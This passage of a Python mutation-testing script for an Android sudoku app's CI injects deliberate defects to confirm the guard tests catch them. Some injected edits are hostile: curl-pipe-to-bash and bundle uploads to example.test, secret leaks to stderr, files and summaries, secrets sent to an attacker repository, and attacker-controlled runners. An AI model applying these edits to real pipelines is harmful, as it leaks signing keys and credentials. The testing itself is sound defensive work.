    Mutation("#208", "the keystore base64 reaches the job summary",
             ".github/workflows/play-api-check.yml",
             sub(r'(            echo "\| committed certificate[^\n]*\n)',
                 r'\1            echo "| b64 | $HS_KEYSTORE_B64 |"\n'),
             "the base64 of the entire keystore lands in the summary",
             'step `keystore` writes the value'),
    Mutation("#206", "release.yml stops calling ci_version.sh",
             ".github/workflows/release.yml",
             sub(r'tools/ci_version\.sh "\$GITHUB_REF_NAME"',
                 'echo name=9.9.9; echo code=9999; : "$GITHUB_REF_NAME"', 0),
             "tag validation and the version-code formula become dead code",
             # Caught by running the step now, not by a substring (#206).
             'propagation'),
    Mutation("#206", "play-promote.yml stops calling play_promote.sh",
             ".github/workflows/play-promote.yml",
             sub(r"tools/play_promote\.sh com\.honestarcade\.sudoku",
                 "echo promoted=999; : com.honestarcade.sudoku", 0),
             "the track allowlist and production refusal become dead code",
             'propagation'),
    Mutation("#209", "a new step publishes the promoted line",
             ".github/workflows/play-promote.yml",
             sub(r"^      - id: promote$",
                 '      - id: note\n'
                 '        run: echo ok\n'
                 '      - id: promote',
                 1, re.M),
             "an inserted step runs with whatever the job holds — here a live Play token",
             'step-set'),
    Mutation("#209", "the summary reports a hardcoded outcome",
             ".github/workflows/play-promote.yml",
             sub(r"PROMOTE_OUTCOME: \$\{\{ steps\.promote\.outcome \}\}",
                 "PROMOTE_OUTCOME: success"),
             "a failed run reports the promote step ended as success",
             "refusal: the summary step's PROMOTE_OUTCOME is"),
    Mutation("#209", "the sidecar computes nothing",
             ".github/workflows/release.yml",
             sub(r'sha256sum "\$aab" > "\$aab\.sha256"', ': > "$aab.sha256"'),
             "the checksum sidecar is empty and the re-download compare is vacuous",
             'sidecar must compute'),
    # ---- #198: the summary must not claim what did not happen -------------
    Mutation("#198", "the summary gate becomes if true", ".github/workflows/play-promote.yml",
             sub(r'if \[ "\$PROMOTE_OUTCOME" = "success" \] && \[ -n "\$codes" \]; then',
                 "if true; then"),
             "#130 verbatim: every failure path publishes a promoted line",
             'summary-honesty'),
    Mutation("#198", "the outcome check is dropped", ".github/workflows/play-promote.yml",
             sub(r'if \[ "\$PROMOTE_OUTCOME" = "success" \] && \[ -n "\$codes" \]; then',
                 'if [ -n "$codes" ]; then'),
             "tee creates promote.out when the step starts, so codes alone prove nothing",
             'summary-honesty'),
    Mutation("#198", "the empty-track refusal is neutered", "tools/play_promote.sh",
             sub(r'die_api "no completed release on \$FROM"', "true", 0),
             "a track holding only a draft promotes nothing and reports success",
             'no-completed-release'),
    Mutation("#198", "the signed artifact is renamed", ".github/workflows/release.yml",
             sub(r"name: honest-sudoku-signed-\$\{\{ github\.ref_name \}\}", "name: bundle"),
             "the artifact no longer identifies the tag it came from",
             'artifact name must carry the tag'),
    # ---- #197: the swallow forms, and the classes closed in one file ------
    Mutation("#197", "|| true hidden behind a shell comment", ".github/workflows/release.yml",
             sub(r'(-alias "\$HS_KEY_ALIAS" > /dev/null)\n', r'\1 || true # tolerate a wrong alias\n'),
             "the helper never stripped comments, so one character reinstated #189",
             'discards the exit status'),
    Mutation("#197", "set +e disarms the body", ".github/workflows/release.yml",
             sub(r"(          set -euo pipefail\n)(          # A PKCS12)", r"\1          set +e\n\2"),
             "every command after it can fail without failing the step",
             'discards the exit status'),
    Mutation("#197", "|| true on the gh upload", ".github/workflows/release.yml",
             sub(r"(gh release upload[^\n]*)", r"\1 || true"),
             "gh was missing from the command list, in the step gh IS",
             'discards the exit status'),
    Mutation("#197", "continue-on-error on ci's shellcheck step", ".github/workflows/ci.yml",
             sub(r"(      - id: shellcheck\n)", r"\1        continue-on-error: true\n"),
             "only three ci steps were required to be unconditional",
             'is conditional'),
    Mutation("#197", "ci's gate job moves to a self-hosted runner", ".github/workflows/ci.yml",
             sub(r"^  gate:\n    runs-on: ubuntu-latest$", "  gate:\n    runs-on: attacker-self-hosted", 1, re.M),
             "runsOn was asserted in release.yml only, and ci.yml inherits secrets",
             'runs on `attacker-self-hosted`'),
    # ---- #200: the rows #190 left open, and #186's own reproduction -------
    # The five #190 entries below this block all covered rows that ALREADY
    # passed before #190's fix. A battery entry for a case that was never
    # broken certifies nothing — which is the complaint #190 itself made
    # about #176, reproduced one level up (#200). These are the open ones.
    Mutation("#200", "a leak appended to the pre-flight failure path", "tools/set_ci_secrets.sh",
             sub(r"(do not open the keystore\.[^\n]*\n)", r'\1  echo "debug: $KEYSTORE_PASS" >&2\n'),
             "a debugging echo on an unasserted failure path prints the password",
             'reached stderr'),
    Mutation("#200", "a leak appended to the keytool-SKIPPED path", "tools/set_ci_secrets.sh",
             sub(r"(pre-flight is SKIPPED[^\n]*\n)", r'\1  echo "debug: $KEYSTORE_PASS" >&2\n'),
             "the same, on the path taken when keytool cannot be resolved",
             'reached stderr'),
    Mutation("#200", "a leak to $TMPDIR", "tools/set_ci_secrets.sh",
             sub(r'(KEY_ALIAS="\$\(read_credential HS_KEY_ALIAS\)"\n)',
                 r'\1echo "$KEYSTORE_PASS" > "${TMPDIR:-/tmp}/leak.txt"\n'),
             "a dump to scratch space, where $RUNNER_TEMP holds the decoded keystore",
             'reached file'),
    Mutation("#200", "a rot13-transformed leak", "tools/set_ci_secrets.sh",
             sub(r'(KEY_ALIAS="\$\(read_credential HS_KEY_ALIAS\)"\n)',
                 r'\1printf %s "$KEYSTORE_PASS" | tr A-Za-z N-ZA-Mn-za-m\n'),
             "a transform the fixed five-form set did not cover",
             'rot13'),
    Mutation("#200", "the password's LAST 8 characters", "tools/set_ci_secrets.sh",
             sub(r'(KEY_ALIAS="\$\(read_credential HS_KEY_ALIAS\)"\n)',
                 r'\1echo "tail: ${KEYSTORE_PASS: -8}"\n'),
             "_leakForms yielded only the first 8",
             'last 8 characters'),
    Mutation("#200", "a password onto argv in the WORKFLOW", ".github/workflows/play-api-check.yml",
             sub(r"-storepass:env HS_KEYSTORE_PASS", '-storepass "$HS_KEYSTORE_PASS"', 0),
             "#186's own reproduction: the source rule scanned tools/ only",
             'a secret reached file'),
    Mutation("#183", "--fail removed from the edit deletion", "tools/play_promote.sh",
             sub(r"curl -sS --fail --connect-timeout 10 --max-time 30",
                 "curl -sS --connect-timeout 10 --max-time 30"),
             "curl exits 0 on 4xx/5xx without --fail, so the warning cannot fire",
             'a DELETE that failed must say so'),
    # ---- #182: the upload rule applied to every file, and step sets -------
    Mutation("#182", "a Play upload added to ci.yml", ".github/workflows/ci.yml",
             sub(r"(        run: tools/gate\.sh\n)",
                 r"\1\n      - id: exfil\n        uses: r0adkll/upload-google-play@v1\n"
                 "        with:\n          serviceAccountJsonPlainText: x\n          track: production\n"),
             "ci.yml is workflow_called with secrets: inherit, so this uploads with the real key on a tag",
             'upload-scope:'),
    Mutation("#182", "an extra step in the ci gate job", ".github/workflows/ci.yml",
             sub(r"(        run: tools/gate\.sh\n)",
                 r"\1\n      - id: extra\n        run: curl -sSL https://example.test/x | bash\n"),
             "an added step in the gate job runs with whatever secrets the caller inherited",
             'ci-shape: exactly these steps'),
    Mutation("#182", "a step between play and summary curls the bundle out", ".github/workflows/release.yml",
             sub(r"^      - id: summary$",
                 "      - id: exfil\n        run: curl -X POST --data-binary @app.aab https://example.test/x\n      - id: summary", flags=re.M),
             "the signed bundle leaves the runner after the upload and before the summary",
             'release-shape: exactly these steps'),
    Mutation("#182", "ship moves to a self-hosted runner", ".github/workflows/release.yml",
             sub(r"^    runs-on: ubuntu-latest$", "    runs-on: attacker-self-hosted", 1, re.M),
             "a self-hosted runner sees every secret this workflow holds",
             'runs on `attacker-self-hosted`'),
    # ---- #189: the merge gate, and three tracing variants -----------------
    Mutation("#189", "if: false on the ci gate job", ".github/workflows/ci.yml",
             sub(r"^  gate:\n    runs-on: ubuntu-latest$",
                 "  gate:\n    if: false\n    runs-on: ubuntu-latest", flags=re.M),
             "the entire merge gate is skipped, and a skipped required check does not block a merge",
             'A skipped job reports as skipped'),
    Mutation("#189", "|| true on the keystore alias check", ".github/workflows/release.yml",
             sub(r'-alias "\$HS_KEY_ALIAS" > /dev/null$',
                 '-alias "$HS_KEY_ALIAS" > /dev/null || true', flags=re.M),
             "a keystore whose alias is not the configured one passes the check meant to catch it",
             'discards the exit status'),
    Mutation("#189", "shell: bash -o xtrace, the long form", ".github/workflows/release.yml",
             sub(r"^defaults:\n  run:\n    shell: bash$",
                 "defaults:\n  run:\n    shell: bash -o xtrace", flags=re.M),
             "every step of the job holding five secrets is traced",
             'secrets:'),
    Mutation("#189", "SHELLOPTS: xtrace in the ship env", ".github/workflows/release.yml",
             sub(r'^      FLUTTER_SUPPRESS_ANALYTICS: "true"$',
                 '      FLUTTER_SUPPRESS_ANALYTICS: "true"\n      SHELLOPTS: xtrace', flags=re.M),
             "bash reads SHELLOPTS at startup, so every step of the job is traced",
             'secrets:'),
    Mutation("#170", "pull_request_target added", ".github/workflows/ci.yml",
             sub(r"^  pull_request:$", "  pull_request:\n  pull_request_target:", flags=re.M),
             "fork code runs with the base repo's secrets and a write token",
             'ci-shape: exactly these triggers'),
    Mutation("#170", "the release trigger becomes a branch", ".github/workflows/release.yml",
             sub(r"    tags:\n      - 'v\*'\n", "    branches:\n      - main\n"),
             "every merge to main would ship to Play",
             'release-shape: only a version tag ships'),

    # ---- the promote refusal (#171) ---------------------------------------
    Mutation("#171", "the refusal is commented out", ".github/workflows/play-promote.yml",
             sub(r"^(\s*)exit 1$", r"\1: # exit 1", count=0, flags=re.M),
             "the step still mentions exit 1 and production, and refuses nothing",
             'was ACCEPTED by the refusal step'),
    Mutation("#171", "a later step becomes unconditional",
             ".github/workflows/play-promote.yml",
             sub(r"(      - id: promote\n)", r"\1        if: always()\n"),
             "the promotion runs even when the refusal failed",
             'so it can run although the refusal failed'),
    Mutation("#171", "a second job with no refusal", ".github/workflows/play-promote.yml",
             append("""  sneaky:
    runs-on: ubuntu-latest
    steps:
      - id: token
        run: gcloud auth activate-service-account --key-file k.json
      - id: promote
        run: tools/play_promote.sh com.honestarcade.sudoku internal production"""),
             "a job with no refusal mints the credential and promotes",
             'not the dispatch input'),

    # ---- play-api-check's keystore step (#173) ----------------------------
    # Was "the alias assertion is disabled", replacing `if [ "$alias_got" !=
    # "$alias_want" ]` with `if false`. #180 deleted that block as dead code:
    # with `-alias`, keytool echoes back the REQUESTED spelling, so the
    # comparison could never fire. The battery reported BROKEN rather than
    # passing over the missing pattern, which is the verdict it exists for.
    #
    # The defect the old entry stood for is still real, and this is the
    # spelling of it that survives: without `-alias`, keytool lists the whole
    # keystore, the step reads the FIRST entry, and a multi-entry keystore
    # whose first alias is not the configured one passes here and fails in
    # release.yml (#165).
    Mutation("#173", "keytool -list loses its -alias", ".github/workflows/play-api-check.yml",
             sub(r' -alias "\$HS_KEY_ALIAS" > "\$listing"', ' > "$listing"'),
             "the alias check asks about the whole keystore, not the configured entry",
             'keytool -list must be scoped to the configured alias'),
    Mutation("#173", "the fingerprint comparison is dropped",
             ".github/workflows/play-api-check.yml",
             sub(r'if \[ "\$bundle_fp" != "\$pem_fp" \]; then', "if false; then"),
             "the uploaded keystore need not match the committed certificate",
             'fingerprint mismatch must fail'),
    Mutation("#173", "the tracks grep loses its || true",
             ".github/workflows/play-api-check.yml",
             sub(r"\{ grep -oE '\"track\":\"\[a-z\]\+\"' \|\| true; \}",
                 "grep -oE '\"track\":\"[a-z]+\"'"),
             "a brand-new app with no tracks fails the check it must pass",
             'empty-tracks'),

    # ---- the keypass equality (#174) --------------------------------------
    Mutation("#174", "the keypass check is deleted", ".github/workflows/release.yml",
             sub(r'          if \[ "\$HS_KEY_PASS" != "\$HS_KEYSTORE_PASS" \]; then.*?\n          fi\n',
                 "", flags=re.S),
             "a mismatch reaches the four-minute Gradle build again",
             'differing passwords must fail'),
    Mutation("#174", "the keypass check is inverted", ".github/workflows/release.yml",
             sub(r'if \[ "\$HS_KEY_PASS" != "\$HS_KEYSTORE_PASS" \]; then',
                 'if [ "$HS_KEY_PASS" = "$HS_KEYSTORE_PASS" ]; then'),
             "every correct release fails",
             'matching: HS_KEY_PASS differs'),

    # ---- the unconverted rules (#175) -------------------------------------
    Mutation("#175", "an unpinned action in flow style", ".github/workflows/release.yml",
             # Appended after the last step, not before the first: inserting it at
             # the front changes `ids.first` and the shape assertion fires for a
             # reason that has nothing to do with pinning.
             sub(r"(      - id: shred\n(?:.*\n)*?        run: [^\n]*\n)",
                 r"\1      - {uses: attacker/action}\n"),
             "an unpinned third party inside the merge gate",
             'pins:'),
    Mutation("#175", "write-all permissions, quoted", ".github/workflows/release.yml",
             sub(r"^permissions:\n  contents: read$",
                 "permissions: 'write-all'", flags=re.M),
             "the job gets every scope",
             # The OFFENDER line, not `permissions:`: that prefix is printed
             # by `permissions_guard_test.dart` on every green run AND by this
             # mutation's own inserted `permissions: 'write-all'` (#244).
             'permissions .github/workflows'),

    # ---- the scripts ------------------------------------------------------
    Mutation("#176", "the password is printed", "tools/set_ci_secrets.sh",
             sub(r'(echo "set: HS_KEYSTORE_B64)', r'echo "pw: $KEY_PASS"\n\1'),
             "the keystore password reaches stdout",
             'leak:'),
    Mutation("#176", "the private key is printed", "tools/setup_play_ci.sh",
             sub(r'(  gh secret set "\$SECRET")', r'  cat "$KEY_PATH"\n\1'),
             "the service-account private key reaches stdout",
             'leak:'),
    Mutation("#176", "secrets go to another repository", "tools/set_ci_secrets.sh",
             sub(r'REPO="honestarcade/HonestSudoku"', 'REPO="attacker/Evil"'),
             "the real keystore is uploaded to someone else's repository",
             'destination:'),
    Mutation("#176", "the key survives a failed upload", "tools/setup_play_ci.sh",
             sub(r"^  trap cleanup_key EXIT INT TERM$", "  : # trap removed", flags=re.M),
             "a live private key is left on disk and the next run mints another",
             'setup-fail:'),
    Mutation("#176", "an IAM role is granted", "tools/setup_play_ci.sh",
             sub(r"(    --display-name \"Honest Sudoku CI\" \\\n)",
                 r"\1    --role roles/owner \\\n"),
             "the service account gets authority nobody needs",
             'iam:'),
    Mutation("#178", "a negative version code is accepted", "tools/play_release_codes.py",
             sub(r'r"\[0-9\]\+"', 'r"-?[0-9]+"'),
             "a negative code is promoted as a version code",
             'negative:'),
    Mutation("#159", "the newline guard is removed", "tools/ci_version.sh",
             sub(r'has_newline "\$run" && die "run number contains a newline"\n', ""),
             "a newline in the run number is accepted again",
             'newline was accepted'),
    # ---- #236/#240: the channels and the wirings the twelfth pass left open --
    # All GREEN at 2aecace. The first is the published-secret guard blinded by
    # one byte; the rest are wirings whose absence changed no verdict.
    Mutation("#236", "a secret is published with one byte that is not UTF-8",
             ".github/workflows/release.yml",
             sub(r'(          test -s "\$RUNNER_TEMP/upload\.keystore")',
                 "\\1\n          printf '%s\\\\377' \"$HS_KEYSTORE_B64\" >> \"$GITHUB_STEP_SUMMARY\"", 1),
             "readAsStringSync threw on the byte and the catch dropped the whole summary",
             'published-secret'),
    Mutation("#236", "a password is written into the workspace with a junk byte",
             "tools/set_ci_secrets.sh",
             sub(r'(KEY_PASS="\$\(read_credential HS_KEY_PASS\)"\n)',
                 r'\1printf "%s\\377" "$KEYSTORE_PASS" > "$PWD/hs-workspace-leak.txt"\n', 1),
             "the workspace scan skipped any file it could not decode, so one byte hid the rest",
             'GITHUB_WORKSPACE',
             creates=("hs-workspace-leak.txt",)),
    Mutation("#240", "the ruleset flag is dropped from the gate step",
             ".github/workflows/ci.yml",
             sub(r"          HS_RULESET_READ_EXPECTED: \$\{\{ secrets\.HS_RULESET_READ_TOKEN != '' && '1' \|\| '' \}\}\n        run: tools/gate\.sh",
                 "        run: tools/gate.sh", 1),
             "a lapsed token then makes the bypass check skip instead of fail, in the gate",
             'ruleset-token'),
    Mutation("#240", "the digest stub stops being the real sha256sum",
             "test/guards/workflow_guard_test.dart",
             sub(r"const _runReal = \{'base64', 'sha256sum'\};",
                 "const _runReal = {'base64'};", 1),
             "the summary's digest row reads `stub output for sha256sum` and nothing minds",
             'bundle SHA-256'),
    Mutation("#240", "a _runReal command the host lacks falls back to an echo",
             "test/guards/workflow_guard_test.dart",
             sub(r"(String\? _realBinary\(String command\) \{\n)",
                 r"\1  if (command.isNotEmpty) return null;\n", 1),
             "on a host without base64 the leak scan silently stops seeing encoded secrets",
             'stub-fidelity'),
    # ---- #237: the defects a positive control names -------------------------
    # A control cannot be protected by mutating the control -- that makes the
    # suite GREENER, so such an entry would SURVIVE by construction. What
    # protects it is a defect whose only NAMED catcher is that control: with
    # the control neutered the refusal entry is still caught by
    # play_promote_args_test, and the pre-flight entry by the leak test's own
    # control, so the battery reports WRONG-REASON rather than SURVIVED.
    # Either way it goes red, which is the protection; "these two survive"
    # was the mechanism claimed at round thirteen, and it is not what happens
    # (#245).
    Mutation("#237", "the promote refusal announces the refusal and exits 0",
             ".github/workflows/play-promote.yml",
             sub(r'(              echo "production is a human act in the Play Console" >&2\n)'
                 r"              exit 1\n",
                 r"\1              exit 0\n", 1),
             "the message still prints, so the honesty control is what names this one",
             'completed on an input it exists to refuse'),
    Mutation("#237", "the secrets pre-flight can never succeed",
             ".github/workflows/release.yml",
             sub(r'(          echo "all five secrets are present"\n)',
                 r"\1          exit 1\n", 1),
             "every refusal still fails as expected; the control is what names this one",
             'the step fails even with every secret set'),
    # ---- #256/#249: what the release itself exposed -------------------------
    # The first is #129 verbatim, green at be84231 because nothing reached the
    # retry branch. The second is a secret used as a FILE NAME, which
    # upload-artifact publishes as surely as the bytes.
    # ---- #260/#261/#263: what round sixteen found -------------------------
    # Every one of these was GREEN at a360810.
    Mutation("#260", "the draft retry promotes a completed release",
             "tools/play_promote.sh",
             sub(r"    attempt_promotion draft \|\| die_api",
                 "    attempt_promotion completed || die_api", 1),
             "the retry asks for the status Play just refused, and calls it a draft",
             'draft-retry: the RETRY did not ask'),
    Mutation("#260", "an attempt commits without promoting anything",
             "tools/play_promote.sh",
             sub(r"  api PUT \"\$API/\$PACKAGE/edits/\$EDIT_ID/tracks/\$TO\".*?\n  \}\n",
                 "", 1, flags=re.S),
             "an edit that commits nothing reads back the track that was already there",
             'draft-retry: expected two track PUTs'),
    # ---- #266: round seventeen found the phrase match itself unguarded ------
    # #260 narrowed the matcher from any 4xx to the PHRASE, and nothing told
    # the two apart: this weakening back to a bare substring was GREEN at
    # 31488be.
    Mutation("#266", "the draft-app rule fires on any 4xx mentioning \"draft\"",
             "tools/play_promote.sh",
             sub(r'\*"only releases with status draft"\*\) return 0 ;;',
                 '*"draft"*) return 0 ;;', 1),
             "a wording change or an unrelated near-miss retries and reports success",
             'draft-retry: a 4xx that mentions'),
    Mutation("#261", "a release cancels the build it was asked to make",
             ".github/workflows/release.yml",
             sub(r"^  cancel-in-progress: false$", "  cancel-in-progress: true", 1,
                 flags=re.M),
             "#252 is what this costs: a cancelled gate and no release",
             'concurrency-values:'),
    Mutation("#261", "the gate takes write on contents",
             ".github/workflows/ci.yml",
             sub(r"^permissions:\n  contents: read$",
                 "permissions:\n  contents: write", 1, flags=re.M),
             "this file is workflow_called with secrets: inherit",
             'permission-values:'),
    Mutation("#261", "a Flutter setup stops reading the pin",
             ".github/workflows/ci.yml",
             sub(r"          channel: stable\n          flutter-version-file: \.fvmrc\n",
                 "          channel: stable\n", 1),
             "the gate then builds with whatever the channel holds that day",
             'flutter-pin:'),
    Mutation("#261", "the version code leaves the release summary",
             ".github/workflows/release.yml",
             sub(r'            echo "\| version code \| \$\{\{ steps\.version\.outputs\.code \}\} \|"\n',
                 "", 1),
             "the one number that finds the build on Play",
             'no longer says "| version code'),
    Mutation("#263", "a credential is pasted into the README's secrets table",
             "README.md",
             append('HS_KEYSTORE_PASS = Hunter2Seventeen'),
             "the file AC6's 'by name only' is actually about",
             'memory-guard: README.md'),
    Mutation("#258", "a credential is pasted into a memory file",
             ".n8/memory/pages.md",
             append('export HS_KEYSTORE_PASS: hunter2seventeen'),
             "these files are committed and readable by anyone with the repository",
             'memory-guard:'),
    Mutation("#256", "the draft-app retry fires on any refusal",
             "tools/play_promote.sh",
             # Anchored on the function's whole body rather than on the
             # single `case` it used to hold: the sixteenth pass gave it a
             # status check and a second `case`, and this entry went BROKEN
             # on its first full run after that (#260).
             sub(r"^is_draft_app_rule\(\) \{\n.*?^\}\n",
                 "is_draft_app_rule() {\n  return 0\n}\n", 1,
                 flags=re.S | re.M),
             "a permission denial is downgraded to a draft and called a success (#129)",
             'draft-retry: a 403 must fail'),
    Mutation("#249", "a secret is used as a file name",
             ".github/workflows/release.yml",
             sub(r'(          test -s "\$RUNNER_TEMP/upload\.keystore")',
                 r'\1\n          touch "$GITHUB_WORKSPACE/$HS_KEYSTORE_B64"', 1),
             "an artifact listing shows the names it swept, not only the bytes",
             'published-secret'),
    Mutation("#245", "the pre-flight cannot complete when the secrets are equal",
             ".github/workflows/release.yml",
             sub(r'(          echo "all five secrets are present"\n)',
                 r'          [ "$HS_KEY_PASS" != "$HS_KEYSTORE_PASS" ] || exit 1\n\1', 1),
             "an inverted copy of keystore_check's own comparison, in a [] step",
             # The fifth control, recorded at round thirteen as impossible to
             # protect. `secrets_present` is `[]`, so the propagation check
             # never runs it, and the pre-flight test runs it with DISTINCT
             # values -- only the leak test's shared-secret pass reaches this
             # line, and only its control names it (#245).
             'cannot complete even with every secret equal'),
    # ---- #243: the channel exclusions a body could write through ------------
    # Both GREEN at de58e85: the skip was by path shape, so a file the body
    # wrote inside `bin/` and the script overwritten under its own feet were
    # dropped from the channel entirely.
    Mutation("#245", "the verdict is handed an empty environment",
             "test/guards/workflow_guard_test.dart",
             sub(r"        doc\['bypass_actors'\],\n        Platform\.environment,",
                 "        doc['bypass_actors'],\n        const <String, String>{},", 1),
             "the flag CI sets never reaches the verdict; a lapsed token skips again",
             'flag-wiring',
             slow=True),
    Mutation("#243", "a secret is written into the harness's own bin directory",
             ".github/workflows/release.yml",
             sub(r'(          test -s "\$RUNNER_TEMP/upload\.keystore")',
                 r'\1\n          printf %s "$HS_KEYSTORE_B64" > "$GITHUB_WORKSPACE/bin/leak"', 1),
             "$GITHUB_WORKSPACE is what upload-artifact sweeps on a runner",
             'published-secret'),
    Mutation("#243", "a secret is written over the step script itself",
             ".github/workflows/release.yml",
             sub(r'(          test -s "\$RUNNER_TEMP/upload\.keystore")',
                 r'\1\n          printf %s "$HS_KEYSTORE_B64" > "$GITHUB_WORKSPACE/step.sh"', 1),
             "the body can overwrite the file it is running from",
             'published-secret'),
    Mutation("#119", "the credentials file is written by a heredoc",
             "tools/make_upload_key.sh",
             sub(r"escape_for_double_quotes \"\$HS_KEYSTORE_PASS\"", '$HS_KEYSTORE_PASS'),
             "a password containing $( ) executes and is recorded wrong",
             # The leak scan added for #190 now fires first, inside the same
             # round-trip test: an unescaped password partially reaches
             # stderr. Earlier and more specific than the old marker.
             'reached stderr'),
    # ---- #22: the engine stays plain Dart --------------------------------
    Mutation("#22", "the engine imports Flutter", "lib/engine/candidates.dart",
             sub(r"^(import 'grid\.dart';)$",
                 r"import 'package:flutter/foundation.dart';\n\1", flags=re.M),
             "the engine could no longer run in a plain isolate or test",
             'engine-imports: 1 offender'),
    Mutation("#22", "the engine reaches out of lib/engine/", "lib/engine/candidates.dart",
             sub(r"^(import 'grid\.dart';)$", r"import '../links.dart';\n\1",
                 flags=re.M),
             "a relative import is a way round the allowlist",
             'engine-imports: 1 offender'),
    Mutation("#22", "the engine uses an unseeded Random", "lib/engine/solver.dart",
             chain(sub(r"^(import 'dart:typed_data';)$", r"import 'dart:math';\n\1",
                       flags=re.M),
                   append("\nfinal unseeded = Random();\n")),
             "an unseeded PRNG breaks same-seed-same-board (invariant 4)",
             'engine-random: 1 offender'),
    # ---- #26: the engine property guards (invariants 2 and 4) ------------
    # The property guards are tagged `slow`, so the per-mutation SUITE leaves
    # them out; these entries run ENGINE_SUITE, the four files that judge the
    # engine, rather than the whole slow suite.
    Mutation("#26", "carving keeps a removal that breaks uniqueness",
             "lib/engine/generator.dart",
             chain(sub(r"if \(counter\(shape, values\) == 1\) \{",
                       "if (counter(shape, values) >= 1) {"),
                   sub(r"      if \(_counter\(shape, values\) != 1\) \{\n"
                       r"        throw StateError\([^;]*\);\n      \}\n", "")),
             "boards with two solutions ship as puzzles (invariant 2)",
             'engine-unique: ', suite=tuple(ENGINE_SUITE)),
    Mutation("#26", "a board is labelled a band it does not grade to",
             "lib/engine/generator.dart",
             chain(sub(r"if \(band != difficulty \|\| given > ceilingCount\) "
                       r"return null;", "if (given > ceilingCount) return null;"),
                   sub(r"\n      if \(g\.band != difficulty\) continue;", "")),
             "a Hard label on a board singles can finish",
             'engine-band: ', suite=tuple(ENGINE_SUITE)),
    # Two edits, because the floor alone never binds on a supported pair:
    # uniqueness stops every carve above it (a first version that only lowered
    # the floor SURVIVED, which is how that was learned). What the floor
    # guards against is a carve that no longer stops at its target: 4×4
    # then runs on toward its uniqueness limit, below n + n/2.
    Mutation("#26", "the floor drops and carving runs past the target",
             "lib/engine/generator.dart",
             chain(sub(r"=> shape\.n \+ shape\.n ~/ 2;", "=> shape.n ~/ 2;"),
                   sub(r"if \(given <= target && band == difficulty\) break;",
                       "if (given <= floor && band == difficulty) break;")),
             "boards emptier than the design's n + n/2 floor",
             'engine-floor: ', suite=tuple(ENGINE_SUITE)),
    Mutation("#26", "generation depends on how often it has run",
             "lib/engine/generator.dart",
             chain(sub(r"(Puzzle generate\([^{]*\{(?:.|\n)*?)final rng = Rng\(seed\);",
                       r"\1final rng = Rng(seed + _generateCalls++);"),
                   append("\nint _generateCalls = 0;\n")),
             "the same seed stops giving the same board (invariant 4)",
             'engine-determinism: ', suite=tuple(ENGINE_SUITE)),
    Mutation("#26", "the ladder tries pairs before locked candidates",
             "lib/engine/human_solver.dart",
             chain(sub(r"  Pointing\(\),\n", ""),
                   sub(r"(  NakedSubset\.pair\(\),\n)", r"\1  Pointing(),\n")),
             "grades, and so the pinned graded boards, change silently",
             'engine-golden: ', suite=tuple(ENGINE_SUITE)),
    Mutation("#26", "the engine reads the clock", "lib/engine/solver.dart",
             append("\nfinal startedAt = DateTime.now();\n"),
             "generation that depends on when it runs is not deterministic",
             'engine-clock: 1 offender'),
    # ---- #28: the game model stays plain Dart ------------------------------
    Mutation("#28", "the game model imports Flutter", "lib/game/notice.dart",
             sub(r"^(import 'package:honest_sudoku/engine/engine\.dart';)$",
                 r"import 'package:flutter/foundation.dart';\n\1", flags=re.M),
             "the rules could no longer be proven without a screen",
             'game-imports: 1 offender'),
    # ---- #38: dart:io is allowed in lib/store/ and nowhere else ------------
    Mutation("#38", "the dart:io allowance widens to all of lib/",
             "test/guards/dependency_rules.dart",
             sub(r"final allowsDartIo = path\.startsWith\('lib/store/'\);",
                 "final allowsDartIo = path.startsWith('lib/');"),
             "any screen could open a socket through dart:io",
             'dart-io-scope: dart:io is allowed outside'),
    Mutation("#38", "the store reaches path_provider outside its one file",
             "lib/store/app_store.dart",
             sub(r"^(import 'codecs\.dart';)$",
                 r"import 'package:path_provider/path_provider.dart';\n\1",
                 flags=re.M),
             "a second place resolving directories is a second place to get it wrong",
             'store-imports: 1 offender'),
]


def run(cmd: list[str], **kw) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, cwd=ROOT, capture_output=True, text=True, **kw)


def parses_as_yaml(path: pathlib.Path) -> bool:
    """A YAML mutation that breaks the syntax proves nothing (#172)."""
    if path.suffix not in {".yml", ".yaml"}:
        return True
    probe = run([
        "python3", "-c",
        "import sys\n"
        "try:\n"
        "    import yaml\n"
        "except ImportError:\n"
        "    sys.exit(3)\n"
        "yaml.safe_load(open(sys.argv[1]))\n",
        str(path),
    ])
    if probe.returncode == 3:
        return True  # no PyYAML here; the Dart guard will report a parse failure
    return probe.returncode == 0


def compiles_as_dart(paths: list[pathlib.Path]) -> bool:
    """The Dart half of the rule `parses_as_yaml` states for YAML (#203).

    A mutation that does not compile fails every test in the file at once,
    which is a red suite for a reason that has nothing to do with the guard
    being measured. YAML had this check from #172; Dart did not, and #203's
    mutation -- a call to a method that was never added -- spent two rounds
    reported as WRONG-REASON when the truth was that the battery could not
    apply it.
    """
    dart = [p for p in paths if p.suffix == ".dart"]
    if not dart:
        return True
    probe = run(["dart", "analyze", "--no-fatal-warnings", *[str(p) for p in dart]])
    return probe.returncode == 0


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--list", action="store_true")
    ap.add_argument("--audit", action="store_true",
                    help="run the marker preflight alone and exit")
    ap.add_argument("--only", default="")
    args = ap.parse_args()

    selected = [m for m in MUTATIONS if args.only.lower() in
                f"{m.issue} {m.name} {m.path}".lower()]

    if args.list:
        for m in selected:
            print(f"{m.issue:<7} {m.path:<42} {m.name}")
        print(f"\n{len(selected)} mutations")
        return 0

    # A run that dies between "write the mutation" and "restore the file"
    # leaves a DEFECT in the working tree, and the next `git commit -a` sweeps
    # it into history. That happened: an owner-role grant on the CI service
    # account rode into a docs commit, and the working tree's later correction
    # hid it from the gate, because the gate reads the tree and not the commit.
    #
    # `finally` cannot cover a kill. A marker can: it outlives the process, so
    # an interrupted run is detectable by the next one instead of silent.
    if IN_FLIGHT.exists():
        print("mutation_check: a previous run did not restore these files:",
              file=sys.stderr)
        print(IN_FLIGHT.read_text().strip(), file=sys.stderr)
        print(f"Check them against HEAD (`git diff HEAD`) before committing "
              f"anything, then delete {IN_FLIGHT}", file=sys.stderr)
        return 2

    dirty = run(["git", "status", "--porcelain"]).stdout.strip()
    if dirty:
        print("mutation_check: refusing to run with uncommitted changes:", file=sys.stderr)
        print(dirty, file=sys.stderr)
        return 2

    # THE MARKERS, BEFORE ANY MUTATION.
    #
    # A verdict here is "the suite went red AND the marker is in its output".
    # A marker that is part of a TEST'S NAME is therefore no verdict at all:
    # the runner prints the names of the tests it runs, so such a marker is
    # present whatever happened, every entry carrying it scores `caught` for
